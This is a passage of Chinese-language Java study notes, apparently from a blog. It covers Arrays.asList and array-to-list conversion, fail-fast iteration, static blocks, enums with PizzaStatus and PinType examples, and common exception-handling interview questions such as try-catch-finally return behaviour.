<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ArrayList</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;E&gt;</span><br><span class="line">      <span class="keyword">implements</span> <span class="title class_">RandomAccess</span>, java.io.Serializable</span><br><span class="line">  &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">         ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">replaceAll</span><span class="params">(UnaryOperator&lt;E&gt; operator)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; c)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们再看一下java.util.AbstractList的remove()方法，这样我们就明白为啥会抛出UnsupportedOperationException。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="如何正确的将数组转换为ArrayList"><a href="#如何正确的将数组转换为ArrayList" class="headerlink" title="如何正确的将数组转换为ArrayList?"></a>如何正确的将数组转换为ArrayList?</h3><p><strong>1.自己动手实现</strong></p>
<p><strong>2.最简便的方法(推荐)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>**3. 使用 Java8 的Stream(推荐)**用这种</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer [] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//基本类型也可以实现转换（依赖boxed的装箱操作）</span></span><br><span class="line"><span class="type">int</span> [] myArray2 = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.stream(myArray2).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p><strong>4. 使用 Guava(推荐)</strong></p>
<p>对于不可变集合，你可以使用ImmutableList类及其of()与copyOf()工厂方法：（参数不能为空）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; il = ImmutableList.of(<span class="string">&quot;string&quot;</span>, <span class="string">&quot;elements&quot;</span>);  <span class="comment">// from varargs</span></span><br><span class="line">List&lt;String&gt; il = ImmutableList.copyOf(aStringArray);      <span class="comment">// from array</span></span><br></pre></td></tr></table></figure>

<p>对于可变集合，你可以使用Lists类及其newArrayList()工厂方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; l1 = Lists.newArrayList(anotherListOrCollection);    <span class="comment">// from collection</span></span><br><span class="line">List&lt;String&gt; l2 = Lists.newArrayList(aStringArray);               <span class="comment">// from array</span></span><br><span class="line">List&lt;String&gt; l3 = Lists.newArrayList(<span class="string">&quot;or&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="string">&quot;elements&quot;</span>); <span class="comment">// from varargs</span></span><br></pre></td></tr></table></figure>

<p><strong>5. 使用 Apache Commons Collections</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">CollectionUtils.addAll(list, str);</span><br></pre></td></tr></table></figure>

<p><strong>6. 使用 Java9 的 <code>List.of()</code>方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">List&lt;Integer&gt; list = List.of(array);</span><br><span class="line">System.out.println(list); <span class="comment">/* [1, 2, 3] */</span></span><br><span class="line"><span class="comment">/* 不支持基本数据类型 */</span></span><br></pre></td></tr></table></figure>



<h3 id="Collection-toArray-方法使用的坑-amp-如何反转数组"><a href="#Collection-toArray-方法使用的坑-amp-如何反转数组" class="headerlink" title="Collection.toArray()方法使用的坑&amp;如何反转数组"></a>Collection.toArray()方法使用的坑&amp;如何反转数组</h3><p>该方法是一个泛型方法：<code>&lt;T&gt; T[] toArray(T[] a);</code> 如果<code>toArray</code>方法中没有传递任何参数的话返回的是<code>Object</code>类型数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] s= <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;lazy&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;over&quot;</span>, <span class="string">&quot;jumps&quot;</span>, <span class="string">&quot;fox&quot;</span>, <span class="string">&quot;brown&quot;</span>, <span class="string">&quot;quick&quot;</span>, <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">List&lt;String&gt; list = Arrays.asList(s);</span><br><span class="line">Collections.reverse(list);</span><br><span class="line">s=list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);<span class="comment">//没有指定类型的话会报错</span></span><br></pre></td></tr></table></figure>

<p>由于JVM优化，<code>new String[0]</code>作为<code>Collection.toArray()</code>方法的参数现在使用更好，<code>new String[0]</code>就是起一个模板的作用，指定了返回数组的类型，0是为了节省空间，因为它只是为了说明返回的类型。详见：<a href="https://shipilev.net/blog/2016/arrays-wisdom-ancients/">https://shipilev.net/blog/2016/arrays-wisdom-ancients/</a></p>
<h3 id="不要在-foreach-循环里进行元素的-remove-x2F-add-操作"><a href="#不要在-foreach-循环里进行元素的-remove-x2F-add-操作" class="headerlink" title="不要在 foreach 循环里进行元素的 remove&#x2F;add 操作"></a>不要在 foreach 循环里进行元素的 remove&#x2F;add 操作</h3><p>如果要进行remove操作，可以调用迭代器的 remove方法而不是集合类的 remove 方法。因为如果列表在任何时间从结构上修改创建迭代器之后，以任何方式除非通过迭代器自身remove&#x2F;add方法，迭代器都将抛出一个ConcurrentModificationException,这就是单线程状态下产生的 fail-fast 机制。</p>
<blockquote>
<p>fail-fast 机制 ：多个线程对 fail-fast 集合进行修改的时，可能会抛出ConcurrentModificationException，单线程下也会出现这种情况，上面已经提到过。</p>
</blockquote>
<p>Java8开始，可以使用Collection#removeIf()方法删除满足特定条件的元素,如 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    list.add(i);</span><br><span class="line">&#125;</span><br><span class="line">list.removeIf(filter -&gt; filter % <span class="number">2</span> == <span class="number">0</span>); <span class="comment">/* 删除list中的所有偶数 */</span></span><br><span class="line">System.out.println(list); <span class="comment">/* [1, 3, 5, 7, 9] */</span></span><br></pre></td></tr></table></figure>

<p><code>java.util</code>包下面的所有的集合类都是fail-fast的，而<code>java.util.concurrent</code>包下面的所有的类都是fail-safe的。</p>
<h2 id="final-static-this-super关键字"><a href="#final-static-this-super关键字" class="headerlink" title="final,static,this,super关键字"></a>final,static,this,super关键字</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><ol>
<li><strong>静态内部类（static修饰类的话只能修饰内部类）：</strong> 静态内部类与非静态内部类之间存在一个最大的区别: 非静态内部类在编译完成之后会隐含地保存着一个引用，该引用是指向创建它的外围类，但是静态内部类却没有。没有这个引用就意味着：1. 它的创建是不需要依赖外围类的创建。2. 它不能使用任何外围类的非static成员变量和方法。</li>
<li><strong>静态导包(用来导入类中的静态资源，1.5之后的新特性):</strong> 格式为：<code>import static</code> 这两个关键字连用可以指定导入某个类中的指定静态资源，并且不需要使用类名调用类中静态成员，可以直接使用类中静态成员变量和成员方法。</li>
</ol>
<h3 id="this和super的区别"><a href="#this和super的区别" class="headerlink" title="this和super的区别"></a>this和super的区别</h3><p>不可以在static环境中用; this是一个指向本对象的指针,super是一个java关键字; 都需要放到方法的第一行; this和super不能同时出现在一个构造函数里面, 因为this必然会调用其他的构造函数, 其他的构造函数必然会有super语句的存在; </p>
<h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><p>定义在类中方法外,静态代码块在非静态代码块之前执行(静态代码块 - 非静态代码块 - 构造方法). 该类不管创建多少对象,静态代码块只执行一次. 一个类中可以有多个静态代码块,位置可以随便放,它不在任何的方法体内,JVM加载类时会执行这些静态代码块,如果静态代码块有多个,JVM将按它们的先后顺序执行,每个代码块只会执行一次.</p>
<p><strong>静态代码块对于定义在它之后的静态变量,可以赋值,但不能访问.</strong></p>
<p>静态代码块可能在第一次new的时候执行，但不一定只在第一次new的时候执行。比如通过 <code>Class.forName(&quot;ClassDemo&quot;)</code>创建 Class 对象的时候也会执行。</p>
<p>非静态代码块在每new一次就执行一次。 非静态代码块可在普通方法中定义(不过作用不大)；而静态代码块不行。</p>
<p>一般情况下,如果有些代码比如一些项目最常用的变量或对象必须在项目启动的时候就执行的时候,需要使用静态代码块,这种代码是主动执行的。如果我们想要设计不需要创建对象就可以调用类中的方法，例如：Arrays类，Character类，String类等，就需要使用静态方法, 两者的区别是 静态代码块是自动执行的而静态方法是被调用的时候才执行的. </p>
<h2 id="java内存泄漏"><a href="#java内存泄漏" class="headerlink" title="java内存泄漏"></a>java内存泄漏</h2><p>java导致内存泄露的原因很明确：长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收，例如threadLocal，这就是java中内存泄露的发生场景。</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>Reference：<a href="https://www.baeldung.com/a-guide-to-java-enums">https://www.baeldung.com/a-guide-to-java-enums</a> </p>
<p><strong>以这种方式定义的常量使代码更具可读性，允许进行编译时检查，预先记录可接受值的列表，并避免由于传入无效值而引起的意外行为。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shuang.kou.enumdemo.enumtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">    ORDERED,</span><br><span class="line">    READY, </span><br><span class="line">    DELIVERED; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单来说，我们通过上面的代码避免了定义常量，我们将所有和 pizza 订单的状态的常量都统一放到了一个枚举类型里面。</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name());<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED);<span class="comment">//ORDERED</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.name().getClass());<span class="comment">//class java.lang.String</span></span><br><span class="line">System.out.println(PizzaStatus.ORDERED.getClass());<span class="comment">//class shuang.kou.enumdemo.enumtest.PizzaStatus</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="自定义枚举方法"><a href="#自定义枚举方法" class="headerlink" title="自定义枚举方法"></a>自定义枚举方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pizza</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> PizzaStatus status;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PizzaStatus</span> &#123;</span><br><span class="line">        ORDERED,</span><br><span class="line">        READY,</span><br><span class="line">        DELIVERED;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isDeliverable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getStatus() == PizzaStatus.READY;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// Methods that set and get the status variable.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用-x3D-x3D-比较枚举类型"><a href="#使用-x3D-x3D-比较枚举类型" class="headerlink" title="使用&#x3D;&#x3D;比较枚举类型"></a>使用&#x3D;&#x3D;比较枚举类型</h3><p>由于枚举类型确保JVM中仅存在一个常量实例，因此我们可以安全地使用 <code>==</code> 运算符比较两个变量，如上例所示；此外，<code>==</code> 运算符可提供编译时和运行时的安全性。</p>
<p>首先，让我们看一下以下代码段中的运行时安全性，其中 <code>==</code> 运算符用于比较状态，并且如果两个值均为null 都不会引发 NullPointerException。相反，如果使用equals方法，将抛出 NullPointerException：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pizza.<span class="type">PizzaStatus</span> <span class="variable">pizza</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">System.out.println(pizza.equals(Pizza.PizzaStatus.DELIVERED));<span class="comment">//空指针异常</span></span><br><span class="line">System.out.println(pizza == Pizza.PizzaStatus.DELIVERED);<span class="comment">//正常运行Copy to clipboardErrorCopied</span></span><br></pre></td></tr></table></figure>

<p>对于编译时安全性，我们看另一个示例，两个不同枚举类型进行比较：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED.equals(TestColor.GREEN)); <span class="comment">// 编译正常</span></span><br><span class="line"><span class="keyword">if</span> (Pizza.PizzaStatus.DELIVERED == TestColor.GREEN);      <span class="comment">// 编译失败，类型不匹配</span></span><br></pre></td></tr></table></figure>

<h3 id="在Switch语句中使用枚举类型"><a href="#在Switch语句中使用枚举类型" class="headerlink" title="在Switch语句中使用枚举类型"></a>在Switch语句中使用枚举类型</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDeliveryTimeInDays</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">        <span class="keyword">case</span> ORDERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> READY:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> DELIVERED:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>…</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">PinType</span> &#123;</span><br><span class="line"></span><br><span class="line">    REGISTER(<span class="number">100000</span>, <span class="string">&quot;注册使用&quot;</span>),</span><br><span class="line">    FORGET_PASSWORD(<span class="number">100001</span>, <span class="string">&quot;忘记密码使用&quot;</span>),</span><br><span class="line">    UPDATE_PHONE_NUMBER(<span class="number">100002</span>, <span class="string">&quot;更新手机号码使用&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String message;</span><br><span class="line"></span><br><span class="line">    PinType(<span class="type">int</span> code, String message) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;PinType&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;code=&quot;</span> + code +</span><br><span class="line">                <span class="string">&quot;, message=&#x27;&quot;</span> + message + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">实际使用：</span><br><span class="line"></span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getCode());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.getMessage());</span><br><span class="line">System.out.println(PinType.FORGET_PASSWORD.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">100001</span></span><br><span class="line">忘记密码使用</span><br><span class="line">PinType&#123;code=<span class="number">100001</span>, message=<span class="string">&#x27;忘记密码使用&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Java异常"><a href="#Java异常" class="headerlink" title="Java异常"></a>Java异常</h1><p>在try语句块中有除数为0的操作，该操作会抛出java.lang.ArithmeticException异常。通过catch，对该异常进行捕获。<br>观察结果我们发现，并没有执行System.out.println(“i&#x3D;”+i)。这说明try语句块发生异常之后，try语句块中的剩余内容就不会再被执行了。</p>
<p>最终一定会执行finally语句块。</p>
<h2 id="1-Error-和-Exception-区别是什么？"><a href="#1-Error-和-Exception-区别是什么？" class="headerlink" title="1. Error 和 Exception 区别是什么？"></a>1. Error 和 Exception 区别是什么？</h2><p>Error 类型的错误通常为虚拟机相关错误，如系统崩溃，内存不足，堆栈溢出 等，编译器不会对这类错误进行检测，JAVA 应用程序也不应对这类错误进行捕 获，一旦这类错误发生，通常应用程序会被终止，仅靠应用程序本身无法恢复； </p>
<p>Exception 类的错误是可以在应用程序中进行捕获并处理的，通常遇到这种错误，应对其进行处理，使应用程序可以继续正常运行。 </p>
<h2 id="2-运行时异常和一般异常-受检异常-区别是什么？"><a href="#2-运行时异常和一般异常-受检异常-区别是什么？" class="headerlink" title="2. 运行时异常和一般异常(受检异常)区别是什么？"></a>2. 运行时异常和一般异常(受检异常)区别是什么？</h2><p>运行时异常包括 RuntimeException 类及其子类，表示 JVM 在运行期间可能出现的异常。 Java 编译器不会检查运行时异常。 </p>
<p>受检异常是Exception 中除 RuntimeException 及其子类之外的异常。 Java 编译器会检查受检异常。 </p>
<p><strong>RuntimeException异常和受检异常之间的区别：</strong>是否强制要求调用者必须处理此异常，如果强制要求调用者必须进行处理，那么就使用受检异常，否则就选择非受检异常(RuntimeException)。一般来讲，如果没有特殊的要求，我们建议使用RuntimeException异常。 </p>
<h2 id="3-JVM-是如何处理异常的？"><a href="#3-JVM-是如何处理异常的？" class="headerlink" title="3. JVM 是如何处理异常的？"></a>3. JVM 是如何处理异常的？</h2><p>在一个方法中如果发生异常，这个方法会创建一个异常对象，并转交给 JVM， 该异常对象包含异常名称，异常描述以及异常发生时应用程序的状态。创建异常 对象并转交给 JVM 的过程称为抛出异常。可能有一系列的方法调用，终才进入抛出异常的方法，这一系列方法调用的有序列表叫做调用栈。</p>
<p>JVM 会顺着调用栈去查找看是否有可以处理异常的代码，如果有，则调用异常处理代码。当 JVM 发现可以处理异常的代码时，会把发生的异常传递给它。如果 JVM 没有找到可以处理该异常的代码块，JVM 就会将该异常转交给默认的异常处理器（默认处理器为 JVM 的一部分），默认异常处理器打印出异常信息并终止应用程序。 </p>
<h2 id="4-throw-和-throws-的区别是什么？"><a href="#4-throw-和-throws-的区别是什么？" class="headerlink" title="4. throw 和 throws 的区别是什么？"></a>4. throw 和 throws 的区别是什么？</h2><p>Java 中的异常处理除了包括捕获异常和处理异常之外，还包括声明异常和拋出 异常，可以通过 throws 关键字在方法上声明该方法要拋出的异常，或者在方法内部通过 throw 拋出异常对象。 </p>
<p>**throws 关键字和 throw 关键字在使用上的几点区别如下： **</p>
<ul>
<li>throw 关键字用在方法内部，只能用于抛出一种异常，用来抛出方法或代码块中的异常，受查异常和非受查异常都可以被抛出。 </li>
<li>throws 关键字用在方法声明上，可以抛出多个异常，用来标识该方法可能抛出的异常列表。一个方法用 throws 标识了可能抛出的异常列表，调用该方法的方法中必须包含可处理异常的代码，否则也要在方法签名中用 throws 关键字声明相应的异常。</li>
</ul>
<h2 id="5-final、finally、finalize-有什么区别？"><a href="#5-final、finally、finalize-有什么区别？" class="headerlink" title="5. final、finally、finalize 有什么区别？"></a>5. final、finally、finalize 有什么区别？</h2><ul>
<li>final可以修饰类、变量、方法，修饰类表示该类不能被继承、修饰方法表示该方法不能被重写、修饰变量表示该变量是一个常量不能被重新赋值。 </li>
<li>finally一般作用在try-catch代码块中，在处理异常的时候，通常我们将一定要执行的代码方法finally代码块中，表示不管是否出现异常，该代码块都会执行，一般用 来存放一些关闭资源的代码。 </li>
<li>finalize是一个方法，属于Object类的一个方法，而Object类是所有类的父类， Java 中允许使用 finalize()方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。 可以手动调用，但是在对象被销毁时，还是会被调用。</li>
</ul>
<h2 id="6-NoClassDefFoundError-和-ClassNotFoundException-区别？"><a href="#6-NoClassDefFoundError-和-ClassNotFoundException-区别？" class="headerlink" title="6. NoClassDefFoundError 和  ClassNotFoundException 区别？"></a>6. NoClassDefFoundError 和  ClassNotFoundException 区别？</h2><p>NoClassDefFoundError 是一个 Error 类型的异常，是由 JVM 引起的，不应该 尝试捕获这个异常。 </p>
<p>引起该异常的原因是 JVM 或 ClassLoader 尝试加载某类时在内存中找不到该类 的定义，该动作发生在运行期间，即编译时该类存在，但是在运行时却找不到 了，可能是变异后被删除了等原因导致； </p>
<p>ClassNotFoundException 是一个受查异常，需要显式地使用 try-catch 对其进行捕获和处理，或在方法签名中用 throws 关键字进行声明。当使用  Class.forName, ClassLoader.loadClass 或 ClassLoader.findSystemClass 动态加载类到内存的时候，通过传入的类路径参数没有找到该类，就会抛出该异常；另一种抛出该异常的可能原因是某个类已经由一个类加载器加载至内存中， 另一个加载器又尝试去加载它。 </p>
<h2 id="7-try-catch-finally-中哪个部分可以省略？"><a href="#7-try-catch-finally-中哪个部分可以省略？" class="headerlink" title="7. try-catch-finally 中哪个部分可以省略？"></a>7. try-catch-finally 中哪个部分可以省略？</h2><p>答：catch 可以省略 </p>
<p>**原因 **</p>
<p>更为严格的说法其实是：try只适合处理运行时异常，try+catch适合处理运行时 异常+普通异常。也就是说，如果你只用try去处理普通异常却不加以catch处理，编译是通不过的，因为编译器硬性规定，普通异常如果选择捕获，则必须用 catch显示声明以便进一步处理。而运行时异常在编译时没有如此规定，所以 catch可以省略，你加上catch编译器也觉得无可厚非。 </p>
<p>理论上，编译器看任何代码都不顺眼，都觉得可能有潜在的问题，所以你即使对所有代码加上try，代码在运行期时也只不过是在正常运行的基础上加一层皮。 但是你一旦对一段代码加上try，就等于显示地承诺编译器，对这段代码可能抛 出的异常进行捕获而非向上抛出处理。如果是普通异常，编译器要求必须用 catch捕获以便进一步处理；如果运行时异常，捕获然后丢弃并且+finally扫尾 处理，或者加上catch捕获以便进一步处理。 </p>
<p>至于加上finally，则是在不管有没捕获异常，都要进行的“扫尾”处理。  </p>
<h2 id="8-try-catch-finally-中，如果-catch-中-return-了，-finally-还会执行吗？"><a href="#8-try-catch-finally-中，如果-catch-中-return-了，-finally-还会执行吗？" class="headerlink" title="8. try-catch-finally 中，如果 catch 中 return 了， finally 还会执行吗？"></a>8. try-catch-finally 中，如果 catch 中 return 了， finally 还会执行吗？</h2><p>答：会执行，在 return 前执行。 </p>
<p><strong>注意：</strong>在 finally 中改变返回值的做法是不好的，因为如果存在 finally 代码块， try中的 return 语句不会立马返回调用者，而是记录下返回值待 finally 代码块 执行完毕之后再向调用者返回其值，然后如果在 finally 中修改了返回值，就会 返回修改后的值。显然，在 finally 中返回或者修改返回值会对程序造成很大的 困扰，C#中直接用编译错误的方式来阻止程序员干这种龌龊的事情，Java 中也 可以通过提升编译器的语法检查级别来产生警告或错误。 </p>
<p><strong>代码示例1：</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>; </span><br><span class="line"><span class="number">3</span>  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">4</span>  System.out.println(a / <span class="number">0</span>); </span><br><span class="line"><span class="number">5</span>  a = <span class="number">20</span>; </span><br><span class="line"><span class="number">6</span>  &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123; </span><br><span class="line"><span class="number">7</span>  a = <span class="number">30</span>; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">9</span>  <span class="comment">/* </span></span><br><span class="line"><span class="comment">10  * return a 在程序执行到这一步的时候，这里不是return a 而是 return 30；这个返回路径就形成了 </span></span><br><span class="line"><span class="comment">11  * 但是呢，它发现后面还有finally，所以继续执行finally的内容，a=40 </span></span><br><span class="line"><span class="comment">12  * 再次回到以前的路径,继续走return 30，形成返回路径之后，这里的a就不是a变量了，而是常量30 </span></span><br><span class="line"><span class="comment">13  */</span> </span><br><span class="line"><span class="number">14</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">15</span>  a = <span class="number">40</span>; </span><br><span class="line"><span class="number">16</span>  &#125; </span><br><span class="line"><span class="number">17</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">18</span> &#125; </span><br></pre></td></tr></table></figure>

<p><strong>执行结果：</strong>30 </p>
<p><strong>代码示例2：</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>; </span><br><span class="line"><span class="number">3</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">4</span>  System.out.println(a / <span class="number">0</span>); </span><br><span class="line"><span class="number">5</span>  a = <span class="number">20</span>; </span><br><span class="line"><span class="number">6</span>  &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123; </span><br><span class="line"><span class="number">7</span>  a = <span class="number">30</span>; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">9</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">10</span>  a = <span class="number">40</span>; </span><br><span class="line"><span class="number">11</span>  <span class="comment">//如果这样，就又重新形成了一条返回路径，由于只能通过1个return返回，所以这里直接返回40 </span></span><br><span class="line"><span class="number">12</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">13</span>  &#125;</span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> &#125; </span><br></pre></td></tr></table></figure>

<p><strong>执行结果：</strong>40  </p>
